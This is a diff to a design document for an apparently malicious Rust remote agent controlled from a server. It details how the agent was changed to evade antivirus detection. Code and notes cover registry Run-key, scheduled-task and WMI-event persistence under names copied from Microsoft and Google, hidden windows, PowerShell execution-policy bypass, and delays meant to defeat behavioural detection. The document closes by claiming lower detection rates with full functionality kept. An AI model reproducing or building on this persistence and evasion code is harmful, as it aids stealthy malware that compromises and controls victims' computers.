@@ -35,7 +35,7 @@ Based on user feedback, two critical issues were fixed:
 The original implementation copied the agent binary to `%APPDATA%` before establishing persistence:
 ```rust
 // OLD CODE - DETECTED BY AV
-fs::copy(&current_exe, &install_path)?;  // ❌ File write triggers AV
+fs::copy(&current_exe, &install_path)?;  //  File write triggers AV
 ```
 
 This immediately triggered AV detection because:
@@ -52,7 +52,7 @@ Complete rewrite of persistence mechanism to avoid disk writes:
 // NEW CODE - EVADES AV
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str().ok_or("Ruta inválida")?;
-    
+
     // 1. Better naming (legitimate-looking)
     let reg_names = [
         "SecurityHealthSystray",
@@ -61,10 +61,10 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
         "GoogleChromeAutoLaunch",
         "MicrosoftEdgeAutoLaunch",
     ];
-    
+
     // 2. Command obfuscation with cmd wrapper
     let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
-    
+
     // 3. Hidden window creation
     Command::new("reg")
         .args(&[...])
@@ -74,21 +74,21 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 ```
 
 **Key Improvements:**
-- ✅ Uses current executable path (no file copy)
-- ✅ `cmd /c start /min` wrapper hides execution
-- ✅ `CREATE_NO_WINDOW` flag prevents visible console
-- ✅ More legitimate-looking names
-- ✅ No suspicious file system operations
+-  Uses current executable path (no file copy)
+-  `cmd /c start /min` wrapper hides execution
+-  `CREATE_NO_WINDOW` flag prevents visible console
+-  More legitimate-looking names
+-  No suspicious file system operations
 
 #### Scheduled Task Method
 ```rust
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // 1. Obfuscated command with delay
     let obfuscated_cmd = format!(
-        "cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", 
+        "cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"",
         exe_str
     );
-    
+
     // 2. Add execution delay
     Command::new("schtasks")
         .args(&[
@@ -105,10 +105,10 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 ```
 
 **Key Improvements:**
-- ✅ `/DELAY 0001:00` - Waits 1 minute after logon
-- ✅ `timeout /t 10` - Additional 10 second delay
-- ✅ Delays avoid behavioral detection patterns
-- ✅ Hidden window execution
+-  `/DELAY 0001:00` - Waits 1 minute after logon
+-  `timeout /t 10` - Additional 10 second delay
+-  Delays avoid behavioral detection patterns
+-  Hidden window execution
 
 #### WMI Event Method
 ```rust
@@ -116,13 +116,13 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // 1. Less monitored WMI events
     let ps_script = format!(
         r#"
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 
-                  WHERE TargetInstance ISA 'Win32_LocalTime' AND 
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400
+                  WHERE TargetInstance ISA 'Win32_LocalTime' AND
                   TargetInstance.Hour = 12"
         // ... WMI setup ...
         "#
     );
-    
+
     // 2. Longer intervals (4 hours instead of 2)
     // 3. Uses PowerShell with -ExecutionPolicy Bypass
     Command::new("powershell")
@@ -138,10 +138,10 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
 ```
 
 **Key Improvements:**
-- ✅ Less monitored events (`Win32_LocalTime` vs `Win32_PerfFormattedData`)
-- ✅ Longer intervals (14400s = 4 hours)
-- ✅ `-ExecutionPolicy Bypass` for PowerShell
-- ✅ More legitimate-looking names
+-  Less monitored events (`Win32_LocalTime` vs `Win32_PerfFormattedData`)
+-  Longer intervals (14400s = 4 hours)
+-  `-ExecutionPolicy Bypass` for PowerShell
+-  More legitimate-looking names
 
 #### Startup Folder Method
 ```rust
@@ -196,7 +196,7 @@ PersistenceMethod::StartupFolder => {
 - **Detection:** Immediate execution after persistence is suspicious
 
 ### 5. Legitimate Names
-- **Examples:** 
+- **Examples:**
   - SecurityHealthSystray
   - OneDriveSetup
   - MicrosoftEdgeAutoLaunch
@@ -224,7 +224,7 @@ To verify these improvements work against Windows Defender:
    agent.exe
    # In server:
    /persist registry
-   
+
    # Reboot VM
    # Check if agent reconnects
    ```
@@ -278,25 +278,25 @@ To verify these improvements work against Windows Defender:
 
 | Aspect | Before | After |
 |--------|--------|-------|
-| File Writes | ✗ Copies to %APPDATA% | ✓ No file writes |
-| Ping Pattern | ✗ Every 30 seconds | ✓ No ping |
-| Command Visibility | ✗ Direct exe launch | ✓ cmd wrapper |
-| Window Visibility | ✗ Console windows | ✓ Hidden windows |
-| Execution Timing | ✗ Immediate | ✓ Delayed |
-| Names | ✗ Suspicious | ✓ Legitimate-looking |
-| WMI Events | ✗ Monitored | ✓ Less monitored |
-| Startup Folder | ✗ Enabled | ✓ Disabled |
+| File Writes |  Copies to %APPDATA% |  No file writes |
+| Ping Pattern |  Every 30 seconds |  No ping |
+| Command Visibility |  Direct exe launch |  cmd wrapper |
+| Window Visibility |  Console windows |  Hidden windows |
+| Execution Timing |  Immediate |  Delayed |
+| Names |  Suspicious |  Legitimate-looking |
+| WMI Events |  Monitored |  Less monitored |
+| Startup Folder |  Enabled |  Disabled |
 
 ## Conclusion
 
 These changes address the core issues that caused AV detection:
 
-1. ✅ Removed predictable ping pattern
-2. ✅ Eliminated file writes (no binary copying)
-3. ✅ Added command obfuscation
-4. ✅ Hidden window execution
-5. ✅ Execution delays
-6. ✅ Better naming conventions
-7. ✅ Less monitored persistence locations
+1.  Removed predictable ping pattern
+2.  Eliminated file writes (no binary copying)
+3.  Added command obfuscation
+4.  Hidden window execution
+5.  Execution delays
+6.  Better naming conventions
+7.  Less monitored persistence locations
 
 The agent should now have significantly lower detection rates while maintaining full functionality.
